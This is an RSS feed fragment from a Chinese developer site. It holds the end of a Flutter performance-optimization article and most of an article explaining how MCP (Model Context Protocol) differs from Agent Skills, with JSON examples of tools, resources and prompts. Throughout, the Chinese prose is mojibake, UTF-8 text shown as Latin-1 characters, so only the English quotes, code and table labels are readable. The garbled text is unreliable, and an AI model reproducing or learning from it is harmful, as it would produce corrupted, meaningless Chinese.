<p>åŸºäºå½±å“èŒƒå›´å’Œå®æ–½éš¾åº¦ç­‰å¤šé‡å› ç´ ï¼Œå»ºè®®æ€§èƒ½ä¼˜åŒ–çš„ä¼˜å…ˆçº§é¡ºåºå¦‚ä¸‹ï¼š</p>





























































<table><thead><tr><th>ä¼˜å…ˆçº§</th><th>ä¼˜åŒ–æ–¹å‘</th><th>å½±å“èŒƒå›´</th><th>å®æ–½éš¾åº¦</th><th>æ¨èå·¥å…·</th></tr></thead><tbody><tr><td><strong>P0</strong></td><td>ä¿®å¤å†…å­˜æ³„æ¼</td><td>æ•´ä¸ªåº”ç”¨</td><td>ä½</td><td>DevTools, LeakCanary</td></tr><tr><td><strong>P0</strong></td><td>ä¼˜åŒ–å¯åŠ¨æ—¶é—´</td><td>é¦–æ¬¡ä½“éªŒ</td><td>ä¸­</td><td>Flutter Performance</td></tr><tr><td><strong>P1</strong></td><td>ä¼˜åŒ–åˆ—è¡¨æ»šåŠ¨</td><td>æ ¸å¿ƒåŠŸèƒ½</td><td>ä¸­</td><td>Performance Overlay</td></tr><tr><td><strong>P1</strong></td><td>ä¼˜åŒ–åŒ…ä½“ç§¯</td><td>ä¸‹è½½ç‡</td><td>ä¸­</td><td>Analyze Size</td></tr><tr><td><strong>P2</strong></td><td>ä¼˜åŒ–åŠ¨ç”»æµç•…åº¦</td><td>ç”¨æˆ·ä½“éªŒ</td><td>é«˜</td><td>Flutter Inspector</td></tr><tr><td><strong>P2</strong></td><td>ä¼˜åŒ–æ„å»ºæ€§èƒ½</td><td>å¼€å‘ä½“éªŒ</td><td>ä½</td><td>Dart Analyzer</td></tr><tr><td><strong>P3</strong></td><td>ä¼˜åŒ–æ¸²æŸ“ç®¡çº¿</td><td>ç‰¹å®šåœºæ™¯</td><td>é«˜</td><td>Custom RenderObject</td></tr></tbody></table>
<h3 data-id="heading-28">æ€»ç»“</h3>
<p>è‡³æ­¤æ€§èƒ½ä¼˜åŒ–çš„çŸ¥è¯†ç‚¹å°±å…¨éƒ¨ä»‹ç»å®Œäº†ï¼Œå…¶æ ¸å¿ƒï¼š</p>
<ul>
<li>éœ€è¦ä»æ¶æ„è®¾è®¡é˜¶æ®µå¼€å§‹è€ƒè™‘</li>
<li>ä¸åŒçš„åº”ç”¨åœºæ™¯éœ€è¦ä¸åŒçš„ä¼˜åŒ–ç­–ç•¥</li>
<li>æ•°æ®é©±åŠ¨</li>
<li>æ‰€æœ‰ä¼˜åŒ–éƒ½è¦æœåŠ¡äºç”¨æˆ·ä½“éªŒ</li>
<li>æ€§èƒ½ä¼˜åŒ–æ˜¯æŒç»­çš„è¿‡ç¨‹</li>
</ul>
<p><strong>è¿‡æ—©ä¼˜åŒ–æ˜¯ä¸‡æ¶ä¹‹æºï¼Œä½†ä¸ä¼˜åŒ–æ˜¯ç”¨æˆ·ä½“éªŒçš„ç¾éš¾ã€‚</strong> ä¼˜åŒ–åœ¨äºæ­£ç¡®çš„æ—¶é—´ï¼Œç”¨æ­£ç¡®çš„æ–¹æ³•ï¼Œä¼˜åŒ–æ­£ç¡®çš„åœ°æ–¹ã€‚</p>
<hr/>
<p><strong>å¦‚æœè§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰å¸®åŠ©ï¼Œåˆ«å¿˜äº†ä¸€é”®ä¸‰è¿æ”¯æŒä¸€ä¸‹ï¼æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµè®¨è®ºï¼</strong>
<strong>è½¬è½½è¯·æ³¨æ˜å‡ºå¤„~~~</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«ææ··äº†ï¼MCP å’Œ Agent Skill åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7584057497205817387</link>    <guid>https://juejin.cn/post/7584057497205817387</guid>    <pubDate>2025-12-16T06:50:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497205817387" data-draft-id="7584057497205768235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«ææ··äº†ï¼MCP å’Œ Agent Skill åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"/> <meta itemprop="keywords" content="AIGC,AIç¼–ç¨‹,Agent"/> <meta itemprop="datePublished" content="2025-12-16T06:50:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«ææ··äº†ï¼MCP å’Œ Agent Skill åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:50:42.000Z" title="Tue Dec 16 2025 06:50:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">MCP ä¸ Skill æ·±åº¦å¯¹æ¯”ï¼šAI Agent çš„ä¸¤ç§æ‰©å±•å“²å­¦</h2>
<p>ç”¨ AI Agent å·¥å…·ï¼ˆClaude Codeã€Cursorã€Windsurf ç­‰ï¼‰çš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸¤ä¸ªæ¦‚å¿µï¼š</p>
<ul>
<li>MCPï¼ˆModel Context Protocolï¼‰</li>
<li>Skillï¼ˆAgent Skillï¼‰</li>
</ul>
<p>å®ƒä»¬çœ‹èµ·æ¥éƒ½æ˜¯"æ‰©å±• AI èƒ½åŠ›"çš„æ–¹å¼ï¼Œä½†å…·ä½“æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿä¸ºä»€ä¹ˆéœ€è¦ä¸¤å¥—æœºåˆ¶ï¼Ÿä»€ä¹ˆæ—¶å€™è¯¥ç”¨å“ªä¸ªï¼Ÿ</p>
<p>è¿™ç¯‡æ–‡ç« ä¼šä»è®¾è®¡å“²å­¦ã€æŠ€æœ¯æ¶æ„ã€ä½¿ç”¨åœºæ™¯ä¸‰ä¸ªç»´åº¦ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ¦‚å¿µå½»åº•è®²æ¸…æ¥šã€‚</p>
<h3 data-id="heading-1">ä¸€å¥è¯åŒºåˆ†</h3>
<p>å…ˆç»™ä¸ªç®€å•çš„å®šä½ï¼š</p>
<blockquote>
<p><strong>MCP è§£å†³"è¿æ¥"é—®é¢˜ï¼šè®© AI èƒ½è®¿é—®å¤–éƒ¨ä¸–ç•Œ</strong>
<strong>Skill è§£å†³"æ–¹æ³•è®º"é—®é¢˜ï¼šæ•™ AI æ€ä¹ˆåšæŸç±»ä»»åŠ¡</strong></p>
</blockquote>
<p>ç”¨ Anthropic å®˜æ–¹çš„è¯´æ³•ï¼š</p>
<blockquote>
<p>"MCP connects Claude to external services and data sources. Skills provide procedural knowledgeâ€”instructions for how to complete specific tasks or workflows."</p>
</blockquote>
<p>æ‰“ä¸ªæ¯”æ–¹ï¼šMCP æ˜¯ AI çš„"æ‰‹"ï¼ˆèƒ½è§¦ç¢°å¤–éƒ¨ä¸–ç•Œï¼‰ï¼ŒSkill æ˜¯ AI çš„"æŠ€èƒ½ä¹¦"ï¼ˆçŸ¥é“æ€ä¹ˆåšæŸä»¶äº‹ï¼‰ã€‚</p>
<p>ä½ éœ€è¦ä¸¤è€…é…åˆï¼šMCP è®© AI èƒ½è¿æ¥æ•°æ®åº“ï¼ŒSkill æ•™ AI æ€ä¹ˆåˆ†ææŸ¥è¯¢ç»“æœã€‚</p>
<h3 data-id="heading-2">MCPï¼šAI åº”ç”¨çš„ USB-C æ¥å£</h3>
<h4 data-id="heading-3">MCP æ˜¯ä»€ä¹ˆ</h4>
<p>MCPï¼ˆModel Context Protocolï¼‰æ˜¯ Anthropic åœ¨ 2024 å¹´ 11 æœˆå‘å¸ƒçš„<strong>å¼€æºåè®®</strong>ï¼Œç”¨äºæ ‡å‡†åŒ– AI åº”ç”¨ä¸å¤–éƒ¨ç³»ç»Ÿçš„äº¤äº’æ–¹å¼ã€‚</p>
<p>å®˜æ–¹çš„æ¯”å–»æ˜¯"AI åº”ç”¨çš„ USB-C æ¥å£"â€”â€”å°±åƒ USB-C æä¾›äº†ä¸€ç§é€šç”¨çš„æ–¹å¼è¿æ¥å„ç§è®¾å¤‡ï¼ŒMCP æä¾›äº†ä¸€ç§é€šç”¨çš„æ–¹å¼è¿æ¥å„ç§å·¥å…·å’Œæ•°æ®æºã€‚</p>
<p><strong>å…³é”®ç‚¹ï¼šMCP ä¸æ˜¯ Claude ä¸“å±çš„ã€‚</strong></p>
<p>å®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾åè®®ï¼Œç†è®ºä¸Šä»»ä½• AI åº”ç”¨éƒ½å¯ä»¥å®ç°ã€‚æˆªè‡³ 2025 å¹´åˆï¼Œå·²ç»è¢«å¤šä¸ªå¹³å°é‡‡ç”¨ï¼š</p>
<ul>
<li><strong>Anthropic</strong>: Claude Desktopã€Claude Code</li>
<li><strong>OpenAI</strong>: ChatGPTã€Agents SDKã€Responses API</li>
<li><strong>Google</strong>: Gemini SDK</li>
<li><strong>Microsoft</strong>: Azure AI Services</li>
<li><strong>å¼€å‘å·¥å…·</strong>: Zedã€Replitã€Codeiumã€Sourcegraph</li>
</ul>
<p>åˆ° 2025 å¹´ 2 æœˆï¼Œå·²ç»æœ‰è¶…è¿‡ 1000 ä¸ªå¼€æº MCP è¿æ¥å™¨ã€‚</p>
<h4 data-id="heading-4">MCP çš„æ¶æ„</h4>
<p>MCP åŸºäº <strong>JSON-RPC 2.0</strong> åè®®ï¼Œé‡‡ç”¨<strong>å®¢æˆ·ç«¯-ä¸»æœº-æœåŠ¡å™¨</strong>ï¼ˆClient-Host-Serverï¼‰æ¶æ„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        Host                              â”‚
â”‚              (Claude Desktop / Cursor)                   â”‚
â”‚                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚   Client    â”‚  â”‚   Client    â”‚  â”‚   Client    â”‚      â”‚
â”‚  â”‚  (GitHub)   â”‚  â”‚ (Postgres)  â”‚  â”‚  (Sentry)   â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚                â”‚                â”‚
          â–¼                â–¼                â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚MCP Server â”‚    â”‚MCP Server â”‚    â”‚MCP Server â”‚
    â”‚ (GitHub)  â”‚    â”‚(Postgres) â”‚    â”‚ (Sentry)  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<ul>
<li><strong>Host</strong>ï¼šç”¨æˆ·ç›´æ¥äº¤äº’çš„åº”ç”¨ï¼ˆClaude Desktopã€Cursorã€Windsurfï¼‰</li>
<li><strong>Client</strong>ï¼šHost åº”ç”¨ä¸­ç®¡ç†ä¸ç‰¹å®š Server é€šä¿¡çš„ç»„ä»¶</li>
<li><strong>Server</strong>ï¼šè¿æ¥å¤–éƒ¨ç³»ç»Ÿçš„æ¡¥æ¢ï¼ˆæ•°æ®åº“ã€APIã€æœ¬åœ°æ–‡ä»¶ç­‰ï¼‰</li>
</ul>
<h4 data-id="heading-5">MCP çš„ä¸‰ä¸ªæ ¸å¿ƒåŸè¯­</h4>
<p>MCP å®šä¹‰äº†ä¸‰ç§ Server å¯ä»¥æš´éœ²çš„åŸè¯­ï¼š</p>
<h5 data-id="heading-6">1. Toolsï¼ˆå·¥å…·ï¼‰â€”â€” æ¨¡å‹æ§åˆ¶</h5>
<p>å¯æ‰§è¡Œçš„å‡½æ•°ï¼ŒAI å¯ä»¥è°ƒç”¨æ¥æ‰§è¡Œæ“ä½œã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Execute SQL query on the database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"sql"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>AI å†³å®šä»€ä¹ˆæ—¶å€™è°ƒç”¨è¿™äº›å·¥å…·ã€‚æ¯”å¦‚ç”¨æˆ·é—®"è¿™ä¸ªæœˆçš„æ”¶å…¥æ˜¯å¤šå°‘"ï¼ŒAI åˆ¤æ–­éœ€è¦æŸ¥æ•°æ®åº“ï¼Œå°±ä¼šè°ƒç”¨ <code>query_database</code> å·¥å…·ã€‚</p>
<h5 data-id="heading-7">2. Resourcesï¼ˆèµ„æºï¼‰â€”â€” åº”ç”¨æ§åˆ¶</h5>
<p>æ•°æ®æºï¼Œä¸º AI æä¾›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"uri"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"file:///Users/project/README.md"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Project README"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mimeType"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text/markdown"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>èµ„æºç”±åº”ç”¨æ§åˆ¶ä½•æ—¶åŠ è½½ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ <code>@</code> å¼•ç”¨èµ„æºï¼Œç±»ä¼¼äºå¼•ç”¨æ–‡ä»¶ã€‚</p>
<h5 data-id="heading-8">3. Promptsï¼ˆæç¤ºï¼‰â€”â€” ç”¨æˆ·æ§åˆ¶</h5>
<p>é¢„å®šä¹‰çš„æç¤ºæ¨¡æ¿ï¼Œå¸®åŠ©ç»“æ„åŒ–ä¸ AI çš„äº¤äº’ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_review"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Review code for bugs and security issues"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç”¨æˆ·æ˜¾å¼è§¦å‘è¿™äº›æç¤ºï¼Œç±»ä¼¼äº Slash Commandã€‚</p>
<h4 data-id="heading-9">MCP ä¸ Function Calling çš„å…³ç³»</h4>
<p>å¾ˆå¤šäººä¼šé—®ï¼šMCP å’Œ OpenAI çš„ Function Callingã€Anthropic çš„ Tool Use æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>
<p><strong>Function Calling</strong> æ˜¯ LLM çš„èƒ½åŠ›â€”â€”æŠŠè‡ªç„¶è¯­è¨€è½¬æ¢æˆç»“æ„åŒ–çš„å‡½æ•°è°ƒç”¨è¯·æ±‚ã€‚LLM æœ¬èº«<strong>ä¸æ‰§è¡Œ</strong>å‡½æ•°ï¼Œåªæ˜¯å‘Šè¯‰ä½ "åº”è¯¥è°ƒç”¨ä»€ä¹ˆå‡½æ•°ï¼Œå‚æ•°æ˜¯ä»€ä¹ˆ"ã€‚</p>
<p><strong>MCP</strong> æ˜¯åœ¨ Function Calling ä¹‹ä¸Šçš„<strong>åè®®å±‚</strong>â€”â€”å®ƒæ ‡å‡†åŒ–äº†"å‡½æ•°åœ¨å“ªé‡Œã€æ€ä¹ˆè°ƒç”¨ã€æ€ä¹ˆå‘ç°"ã€‚</p>
<p>ä¸¤è€…çš„å…³ç³»ï¼š</p>
<pre><code class="hljs language-vbscript" lang="vbscript">ç”¨æˆ·è¾“å…¥ â†’ LLM (<span class="hljs-keyword">Function</span> Calling) â†’ <span class="hljs-string">"éœ€è¦è°ƒç”¨ query_database"</span>
                                           â†“
                                    MCP Protocol
                                           â†“
                                    MCP <span class="hljs-built_in">Server</span> æ‰§è¡Œ
                                           â†“
                                    è¿”å›ç»“æœç»™ LLM
</code></pre>
<p><strong>Function Calling è§£å†³"å†³å®šåšä»€ä¹ˆ"ï¼ŒMCP è§£å†³"æ€ä¹ˆåšåˆ°"ã€‚</strong></p>
<h4 data-id="heading-10">MCP çš„ä¼ è¾“æ–¹å¼</h4>
<p>MCP æ”¯æŒä¸¤ç§ä¸»è¦çš„ä¼ è¾“æ–¹å¼ï¼š</p>




















<table><thead><tr><th>ä¼ è¾“æ–¹å¼</th><th>é€‚ç”¨åœºæ™¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>Stdio</strong></td><td>æœ¬åœ°è¿›ç¨‹</td><td>Server åœ¨æœ¬åœ°æœºå™¨è¿è¡Œï¼Œé€‚åˆéœ€è¦ç³»ç»Ÿçº§è®¿é—®çš„å·¥å…·</td></tr><tr><td><strong>HTTP/SSE</strong></td><td>è¿œç¨‹æœåŠ¡</td><td>Server åœ¨è¿œç¨‹è¿è¡Œï¼Œé€‚åˆäº‘æœåŠ¡ï¼ˆGitHubã€Sentryã€Notionï¼‰</td></tr></tbody></table>
<p>å¤§éƒ¨åˆ†äº‘æœåŠ¡ç”¨ HTTPï¼Œæœ¬åœ°è„šæœ¬å’Œè‡ªå®šä¹‰å·¥å…·ç”¨ Stdioã€‚</p>
<h4 data-id="heading-11">MCP çš„ä»£ä»·</h4>
<p>MCP ä¸æ˜¯å…è´¹çš„åˆé¤ï¼Œå®ƒæœ‰æ˜æ˜¾çš„æˆæœ¬ï¼š</p>
<p><strong>1. Token æ¶ˆè€—å¤§</strong></p>
<p>æ¯ä¸ª MCP Server éƒ½ä¼šå ç”¨ä¸Šä¸‹æ–‡ç©ºé—´ã€‚æ¯æ¬¡å¯¹è¯å¼€å§‹ï¼ŒMCP Client éœ€è¦å‘Šè¯‰ LLM "ä½ æœ‰è¿™äº›å·¥å…·å¯ç”¨"ï¼Œè¿™äº›å·¥å…·å®šä¹‰ä¼šæ¶ˆè€—å¤§é‡ Tokenã€‚</p>
<p>è¿æ¥å¤šä¸ª MCP Server åï¼Œå…‰æ˜¯å·¥å…·å®šä¹‰å¯èƒ½å°±å ç”¨äº†ä¸Šä¸‹æ–‡çª—å£çš„å¾ˆå¤§ä¸€éƒ¨åˆ†ã€‚ç¤¾åŒºè§‚å¯Ÿåˆ°ï¼š</p>
<blockquote>
<p>"We're seeing a lot of MCP developers even at enterprise build MCP servers that expose way too much, consuming the entire context window and leading to hallucination."</p>
</blockquote>
<p><strong>2. éœ€è¦ç»´æŠ¤è¿æ¥</strong></p>
<p>MCP Server æ˜¯æŒä¹…è¿æ¥çš„å¤–éƒ¨è¿›ç¨‹ã€‚Server æŒ‚äº†ã€ç½‘ç»œæ–­äº†ã€è®¤è¯è¿‡æœŸäº†ï¼Œéƒ½ä¼šå½±å“ AI çš„èƒ½åŠ›ã€‚</p>
<p><strong>3. å®‰å…¨é£é™©</strong></p>
<p>Anthropic å®˜æ–¹è­¦å‘Šï¼š</p>
<blockquote>
<p>"Use third party MCP servers at your own risk - Anthropic has not verified the correctness or security of all these servers."</p>
</blockquote>
<p>ç‰¹åˆ«æ˜¯èƒ½è·å–å¤–éƒ¨å†…å®¹çš„ MCP Serverï¼ˆæ¯”å¦‚ç½‘é¡µæŠ“å–ï¼‰ï¼Œå¯èƒ½å¸¦æ¥ prompt injection é£é™©ã€‚</p>
<h4 data-id="heading-12">MCP çš„ä»·å€¼</h4>
<p>å°½ç®¡æœ‰è¿™äº›ä»£ä»·ï¼ŒMCP çš„ä»·å€¼åœ¨äº<strong>æ ‡å‡†åŒ–å’Œå¯å¤ç”¨æ€§</strong>ï¼š</p>
<ul>
<li><strong>ä¸€æ¬¡å®ç°ï¼Œåˆ°å¤„ä½¿ç”¨</strong>ï¼šåŒä¸€ä¸ª GitHub MCP Server å¯ä»¥åœ¨ Claude Desktopã€Cursorã€Windsurf ä¸­ä½¿ç”¨</li>
<li><strong>åŠ¨æ€å‘ç°</strong>ï¼šAI å¯ä»¥åœ¨è¿è¡Œæ—¶å‘ç°æœ‰å“ªäº›å·¥å…·å¯ç”¨ï¼Œè€Œä¸æ˜¯å†™æ­»åœ¨ä»£ç é‡Œ</li>
<li><strong>ä¾›åº”å•†æ— å…³</strong>ï¼šä¸ä¾èµ–ç‰¹å®šçš„ LLM æä¾›å•†</li>
</ul>
